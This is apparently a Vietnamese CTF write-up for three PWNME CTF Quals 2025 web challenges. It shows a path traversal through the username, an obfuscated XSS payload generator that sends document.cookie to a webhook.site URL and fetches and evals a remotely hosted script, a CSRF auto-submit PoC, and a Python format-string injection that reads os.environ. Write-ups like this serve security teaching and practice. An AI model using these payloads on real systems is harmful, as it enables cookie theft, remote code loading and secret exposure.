---
title: "PWNME CTF Quals 2025"
description: "PWNME CTF Quals 2025"
summary: "PWNME CTF Quals 2025 writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-03-04
draft: false
cover: ../../post/pwnmequals2025/feature.jpg

authors:
  - winky
---


Giải này có nhiều bài hay nhưng mà mình chỉ kịp làm được 2 bài hjx. Thôi cùng làm lại nào.

## ProfileEditor

### Source

https://drive.google.com/file/d/1nGsDDet76cb70DUe5Egzf2eetI07h6as/view?usp=sharing

### Hints

Path traversal

### Solution

Challenge cho mình một trang web sau dùng để lưu profile

![image](https://hackmd.io/_uploads/Sy8Zp0XoJg.png)

![image](https://hackmd.io/_uploads/rkkETRmsyx.png)

Nhìn qua mình thấy không có gì sú cả nên xem source 

```python
@app.route('/show_profile', methods=['GET', 'POST'])
def show_profile():
    if not session.get('username'):
        return redirect('/login')
    
    profiles_file = 'profile/' + session.get('username')

    if commonpath((app.root_path, abspath(profiles_file))) != app.root_path:
        return render_template('error.html', msg='Error processing profile file!', return_to='/profile')

    profile = ''
    if exists(profiles_file):
        with open(profiles_file, 'r') as f:
            profile = f.read()

    return render_template('show_profile.html', username=session.get('username'), profile=profile)
```

Ở đây web sẽ lấy file tại đường dẫn `'profile/' + session.get('username')` nên mình có thể tạo một user tên là ../flag.txt và web sẽ mở file profile/../flag.txt 

![image](https://hackmd.io/_uploads/H14n4E7j1x.png)

Từ đó mình có flag

![image](https://hackmd.io/_uploads/HJL6E4miJe.png)

## Hack the bot 1 



### Source

https://drive.google.com/file/d/1f-Zsx9eZ-AsDknFy_gQkbRIMUd2D6aWh/view?usp=sharing

### Hints

XSS

### Solution

Ok đây là một bài khá dài đây mình đã tồn hết nửa ngày để debug hjx. Chúng ta cần để ý những file sau

<details>
<summary>app.js</summary>
    
```js
const express = require('express');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const puppeteer = require('puppeteer');
const { format } = require('date-fns');

const app = express();
const port = 5000;

const logPath = '/tmp/bot_folder/logs/';
const browserCachePath = '/tmp/bot_folder/browser_cache/';

const cookie = {
    name: 'Flag',
    value: "PWNME{FAKE_FLAG}",
    sameSite: 'Strict'
};

app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, 'public')));

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

if (!fs.existsSync(logPath)) {
    fs.mkdirSync(logPath, { recursive: true });
}

if (!fs.existsSync(browserCachePath)) {
    fs.mkdirSync(browserCachePath, { recursive: true });
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

async function startBot(url, name) {
    const logFilePath = path.join(logPath, `${name}.log`);

    try {
        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);

        const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
        });

        const page = await browser.newPage();
        await page.goto(url);

        if (url.startsWith("http://localhost/")) {
            console.log("OKKKKK")
            await page.setCookie(cookie);
        }

        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
        console.log("Visited page");
        await sleep(7000);
        await browser.close();

        logStream.write(`${new Date()} : Finished execution\n`);
        logStream.end();
    } catch (e) {
        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
        logStream.end();
    }
}

app.get('/', (req, res) => {
    res.render('index');
});

app.get('/report', (req, res) => {
    res.render('report');
});

app.post('/report', (req, res) => {
    const url = req.body.url;
    const name = format(new Date(), "yyMMdd_HHmmss");
    startBot(url, name);
    res.status(200).send(`logs/${name}.log`);
});

app.listen(port, () => {
    console.log(`App running at http://0.0.0.0:${port}`);
});    
```
    
</details>

<details>
<summary>script.js</summary>
    
```js
$(document).ready(function() {
    $('#reportForm').on('submit', function(e) {
        e.preventDefault();
        var url = $('#urlInput').val();
        var messageElement = $('#message');

        $.ajax({
            type: 'POST',
            url: '/report',
            data: { url: url },
            success: function(response) {
                var messageHtml = `In progress, you can check logs <a href="${response}"style="color: green; text-decoration: underline;">here</a>`;
                messageElement.html(messageHtml).removeClass('error').addClass('success');
            },
            error: function(xhr) {
                messageElement.text('Erreur: ' + xhr.responseText).removeClass('success').addClass('error');
            }
        });
    });
});

// Implements search functionality, filtering articles to display only those matching the search words (considering whole words case-insensitive matches)

function getSearchQuery() {
    const params = new URLSearchParams(window.location.search);
    // Utiliser une valeur par défaut de chaîne vide si le paramètre n'existe pas
    return params.get('q') ? params.get('q').toLowerCase() : '';
}

document.addEventListener('DOMContentLoaded', function() {
    const searchQuery = getSearchQuery();
    document.getElementById('search-input').value = searchQuery; 
    if (searchQuery) {
        searchArticles(searchQuery);
    }
});

document.getElementById('search-icon').addEventListener('click', function() {
    searchArticles();
});

document.getElementById('search-input').addEventListener('keypress', function(event) {
    if (event.key === 'Enter') {
        searchArticles();
    }
});

function searchArticles(searchInput = document.getElementById('search-input').value.toLowerCase().trim()) {
    const searchWords = searchInput.split(/[^\p{L}]+/u);
    const articles = document.querySelectorAll('.article-box');
    let found = false;
    articles.forEach(article => {
        if (searchInput === '') {
            article.style.display = '';
            found = true;
        } else {
            const articleText = article.textContent.toLowerCase();
            const isMatch = searchWords.some(word => word && new RegExp(`${word}`, 'ui').test(articleText));
            if (isMatch) {
                article.style.display = '';
                found = true;
            } else {
                article.style.display = 'none';
            }
        }
    });   
    const noMatchMessage = document.getElementById('no-match-message');
    if (!found && searchInput) {
        noMatchMessage.innerHTML = `No results for "${searchInput}".`;
        noMatchMessage.style.display = 'block';
    } else {
        noMatchMessage.style.display = 'none';
    }
}    
```
    
</details>

Challenge sẽ cho ta một trang web như sau

![image](https://hackmd.io/_uploads/ry6n8Emjye.png)

 Đọc source thì mình thấy có nút report nên mình nghĩ đến những bug xss hoặc csrf và mình thấy có một chỗ chúng ta có thể chèn payload

 ```js
 function getSearchQuery() {
    const params = new URLSearchParams(window.location.search);
    // Utiliser une valeur par défaut de chaîne vide si le paramètre n'existe pas
    return params.get('q') ? params.get('q').toLowerCase() : '';
}
 ```
 
 Ok thì chèn như thế nào ? ở đây nếu chúng ta query một từ nào đó thì web sẽ kiếm những article có chứa từ đó.
 
![image](https://hackmd.io/_uploads/rJIQ3N7i1x.png)

Nhưng nếu không tìm thấy thì sao? web sẽ thông báo lỗi từ đó và đây là nguồn cơn của vấn đề.

![image](https://hackmd.io/_uploads/HJWNhV7iJx.png)

Ta có thể chèn vào các tag không bị cấm như iframe 

![image](https://hackmd.io/_uploads/rkjBn4moyx.png)

Và từ đó challenge trở thành bypass xss

![image](https://hackmd.io/_uploads/ryHAJB7jkl.png)

Ok thì mình tìm và thử các payload và thấy cái này là xài ngon

```html
<input type=hidden oncontentvisibilityautostatechange="prompt(1)" style=content-visibility:auto>
```

Đưa vào và ta có thể triệu hồi prompt. Ở đây mình không xài alert vì đã bị filter rồi 

![image](https://hackmd.io/_uploads/ryrQbLmi1x.png)

Ngay cả fetch cũng bị filter...

![image](https://hackmd.io/_uploads/SkToML7ikx.png)

Vậy là hết cứu rồi sao? Không sao mình sẽ tiếp tục debug và thấy rằng nó sẽ split payload và lấy các word của mình thông qua một lệnh regex 

![image](https://hackmd.io/_uploads/rksYMI7o1x.png)

Ví dụ như sau : 

![image](https://hackmd.io/_uploads/S1NAM8Xo1x.png)

Ok từ đây mình có ý tưởng là sử dụng từ fetch kết hợp với một từ nào đó để cho thằng regex split ra nhưng không thể tìm được sau đó mình thực hiện replace hoặc split là xong 

![image](https://hackmd.io/_uploads/Bkc4m8mi1x.png)

Ok và ta sẽ thử payload sau

```html
<input type=hidden oncontentvisibilityautostatechange="console.log(`fetchabc`.replace(`abc`, ``)" style=content-visibility:auto>
```

![image](https://hackmd.io/_uploads/H1BYmUXsJl.png)

Ok và ta đã lấy được chữ fetch mà không bị filter. Để automatic thì mình viết script để làm y chang với từng ký tự luôn.

```python
payload = ""
s = "fetch('https://webhook.site/4e8ba4a0-ce61-41ca-b16f-802804f6f5a2/?'+document.cookie)"
payload += '`'
for i in s:
    payload += (i+"abc")
payload += '`'
for i in s:
    payload += ".replace('abc','')"
print(payload.replace("+", "%2b"))
```

Sau khi chạy thì ta có một payload như sau

![image](https://hackmd.io/_uploads/ryDOrLXokg.png)

Nhìn dài vậy nhưng nó chỉ là một lệnh fetch thôi

![image](https://hackmd.io/_uploads/SyFtBLQikg.png)

Ok cuối cùng chúng ta có payload sau để thực hiện XSS và mình đã thành công catch được webhook

```html
<input type=hidden oncontentvisibilityautostatechange="eval(`fabceabctabccabchabc(abc'abchabctabctabcpabcsabc:abc/abc/abcwabceabcbabchabcoabcoabckabc.abcsabciabctabceabc/abc4abceabc8abcbabcaabc4abcaabc0abc-abccabceabc6abc1abc-abc4abc1abccabcaabc-abcbabc1abc6abcfabc-abc8abc0abc2abc8abc0abc4abcfabc6abcfabc5abcaabc2abc/abc?abc'abc%2babcdabcoabccabcuabcmabceabcnabctabc.abccabcoabcoabckabciabceabc)abc`.replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc',''))" style=content-visibility:auto>
```


![image](https://hackmd.io/_uploads/Hy2ID8mi1e.png)

Ok thì mình tiến hành gửi report nhưng không có cookie nào được gửi về cả

![image](https://hackmd.io/_uploads/Hyc5wLQiJl.png)


![image](https://hackmd.io/_uploads/BybqwLQiJl.png)

Có mọt điểm đáng chú ý mà mình đã dành 2 tiếng để debug ra chính là bot sẽ vào rồi mới set cookie. Theo race condition thì mình sẽ lấy cookie khi nó chưa set nên nó trống. 


```js
async function startBot(url, name) {
    const logFilePath = path.join(logPath, `${name}.log`);

    try {
        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);

        const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
        });

        const page = await browser.newPage();
        await page.goto(url);

        if (url.startsWith("http://localhost/")) {
            console.log("OKKKKK")
            await page.setCookie(cookie);
        }

        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
        console.log("Visited page");
        await sleep(7000);
        await browser.close();

        logStream.write(`${new Date()} : Finished execution\n`);
        logStream.end();
    } catch (e) {
        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
        logStream.end();
    }
}
```

Từ đó mình có ý tưởng sử dụng setTimeout nhưng payload của mình sẽ bị lowercase... Nên mình mới nghĩ ra cách sẽ host payload và gọi lệnh để eval và ta không đụng đến chữ in hoa nào cả hehe

![image](https://hackmd.io/_uploads/BJN__8Qi1x.png)

Chúng ta thay đổi payload lại như sau

```python
payload = ""
s = "fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit2.js').then(r=>r.text()).then(d=>eval(d))"
payload += '`'
for i in s:
    payload += (i+"abc")
payload += '`'
for i in s:
    payload += ".replace('abc','')"
print(payload.replace("+", "%2b"))
```

```html
<input type=hidden oncontentvisibilityautostatechange="eval(`fabceabctabccabchabc(abc'abchabctabctabcpabcsabc:abc/abc/abc9abc2abc8abc8abc2abc0abc6abccabc-abcdabc9abccabc3abc-abc4abc8abc1abc9abc-abc8abc3abcdabc6abc-abc2abc8abccabc8abc5abceabcbabc8abcdabc2abc2abc8abc-abc0abc0abc-abc1abcnabcbabcmabc4abcbabc0abctabc9abcpabckabcbabcsabc.abcsabcpabcoabccabckabc.abcrabceabcpabclabciabctabc.abcdabceabcvabc/abceabcxabcpabclabcoabciabctabc2abc.abcjabcsabc'abc)abc.abctabchabceabcnabc(abcrabc=abc>abcrabc.abctabceabcxabctabc(abc)abc)abc.abctabchabceabcnabc(abcdabc=abc>abceabcvabcaabclabc(abcdabc)abc)abc`.replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc','').replace('abc',''))" style=content-visibility:auto>
```

Ok sau khi gửi payload này cho report thì mình có flag. 

![image](https://hackmd.io/_uploads/S1IoK87jyl.png)

![image](https://hackmd.io/_uploads/BJeRKUXoye.png)

## Say my name 

### Source

https://drive.google.com/file/d/1nYXBK08TOdMrT6koHSYCiiXKav_zBcIP/view?usp=sharing

### Hints

XSS and format string

### Solution

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/rkPehLQoye.png)

![image](https://hackmd.io/_uploads/SyGb28Xjkl.png)

Ok nó chỉ hiện text thôi nhưng mà mình đọc devtool thì thấy chữ hello là một tag a và khi focus vào thì mình sẽ đi đến một trang web nào đó.

![image](https://hackmd.io/_uploads/rkI12x4jke.png)

Lúc làm bài này thì mình không nghĩ đến tận dụng thằng onfocus :) Nhưng mà nó sẽ đơn giản như thế này

```\";alert(1)//```

Payload trên sẽ trigger một cái alert khi mình focus cụ thể là click vào. 

![image](https://hackmd.io/_uploads/BkIpJZ4jyg.png)

Ok và mình xác nhận trang web có thể XSS. Nhưng có một vấn đề payload của ta sẽ bị filter nghiêm ngặt.

```python
def sanitize_input(input_string):
    input_string = input_string.replace('<', '')
    input_string = input_string.replace('>', '')
    input_string = input_string.replace('\'', '')
    input_string = input_string.replace('&', '')
    input_string = input_string.replace('"', '\\"')
    input_string = input_string.replace(':', '')
    return input_string
```

Không sao chúng ta có thể bypass như sau và lấy được cookie ez

```\";fetch(`//webhook.site/4e8ba4a0-ce61-41ca-b16f-802804f6f5a2/?`+document.cookie) //```



![image](https://hackmd.io/_uploads/rJ4PDWNiyl.png)

Từ request đó ta có thể tạo một POC để report

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://127.0.0.1:5000/your-name" method="POST">
      <input type="hidden" name="name" value="&#92;&quot;&#59;fetch&#40;&#96;&#47;&#47;webhook&#46;site&#47;4e8ba4a0&#45;ce61&#45;41ca&#45;b16f&#45;802804f6f5a2&#47;&#63;&#96;&#43;document&#46;cookie&#41;&#32;&#47;&#47;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Ok payload trên chắc chắn không chạy được vì tag a chỉ được thêm payload chứ chưa có focus gì hết. Lúc này mình mới thêm đuôi #behindthename-redirect để trang web thực hiện focus và ta có payload sau.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://127.0.0.1:5000/your-name#behindthename-redirect" method="POST">
      <input type="hidden" name="name" value="&#92;&quot;&#59;fetch&#40;&#96;&#47;&#47;webhook&#46;site&#47;4e8ba4a0&#45;ce61&#45;41ca&#45;b16f&#45;802804f6f5a2&#47;&#63;&#96;&#43;document&#46;cookie&#41;&#32;&#47;&#47;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


![image](https://hackmd.io/_uploads/rJx4dbEo1g.png)

Ok và ta đã có X-Admin-Token và mình sẽ xem hàm sau.


```python
@app.route('/admin', methods=['GET'])
def admin():
    if request.cookies.get('X-Admin-Token') != X_Admin_Token:
        return 'Access denied', 403
    
    prompt = request.args.get('prompt')
    return render_template('admin.html', cmd=f"{prompt if prompt else 'prompt$/>'}{run_cmd()}".format(run_cmd))
```

Có thể thấy từ query prompt sẽ được render ra web nên mình thử số 0 xem. Wow nó trả ra hàm run_cmd. Ok và ta xác định mục tiêu là lấy dược environment

```{0}```


![image](https://hackmd.io/_uploads/SyQ75WViyl.png)

Từ đây mình có nhiều hướng để khai thác như lấy các biến có trong app flask

```{0.__globals__}```

![image](https://hackmd.io/_uploads/HywPTbNjyx.png)

Nhảy vào app flask và gọi hàm nguyên thủy của nó

```{0.__globals__[app].__init__}```

![image](https://hackmd.io/_uploads/rJAjA-EjJx.png)

Lấy các biến có trong môi trường python

```{0.__globals__[app].__init__.__globals__}```

![image](https://hackmd.io/_uploads/HJ1TCWEo1x.png)

Lấy lệnh sys và lấy environment của máy. Và từ đó ta có flag được add vào environment từ trước.

```{0.__globals__[app].__init__.__globals__[sys].modules[os].environ}```

![image](https://hackmd.io/_uploads/H1G11M4skg.png)
